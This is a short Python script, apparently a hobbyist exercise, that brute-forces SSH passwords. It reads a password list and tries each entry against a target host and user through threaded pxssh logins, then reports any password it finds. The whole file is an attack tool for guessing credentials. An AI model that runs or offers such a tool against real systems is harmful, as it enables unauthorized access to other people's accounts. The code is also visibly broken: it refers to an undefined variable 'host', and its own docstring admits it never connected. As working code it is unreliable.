#!/bin/env python3
# -*- coding: utf-8 -*-
# version: Python3.X
"""
2017.01.31 ssh 爆破, 要使用到 pxssh 库, 但是没找到啊, 发现是藏在 pexpect 库里了, 依旧是连接不上
"""
import pexpect.pxssh as pxssh
import optparse
import time
import threading

__author__ = '__L1n__w@tch'

max_connections = 5
connection_lock = threading.BoundedSemaphore(value=max_connections)
found = False
fails = 0


def connect(host, user, password, release):
    global found, fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print("[+] Password Found: {}".format(password))
        found = True
    except Exception as e:
        if "read_nonblocking" in str(e):
            fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif "synchronize with original prompt" in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def main():
    parser = optparse.OptionParser("usage %prog -H <target host> -u <user> -F <password list>")
    parser.add_option("-H", dest="target_host", type=str, help="specifiy target host")
    parser.add_option("-F", dest="password_file", type=str, help="specifiy password file")
    parser.add_option("-u", dest="user", type=str, help="specifiy the user")

    options, args = parser.parse_args()
    target_host = options.target_host
    password_file = options.password_file
    user = options.user

    if target_host is None or password_file is None or user is None:
        print(parser.usage)
        exit(-1)

    with open(password_file, "r") as f:
        for line in f.readlines():
            if found:
                print("[*] Exiing: Password Found")
                exit(0)
            if fails > 5:
                print("[!] Exiting: Too Many Socket Timeouts")
                exit(-1)
            connection_lock.acquire()
            password = line.strip("\r\n")
            print("[-] Testing: {}".format(password))
            t = threading.Thread(target=connect, args=(host, user, password, True))
            child = t.start()


if __name__ == "__main__":
    main()
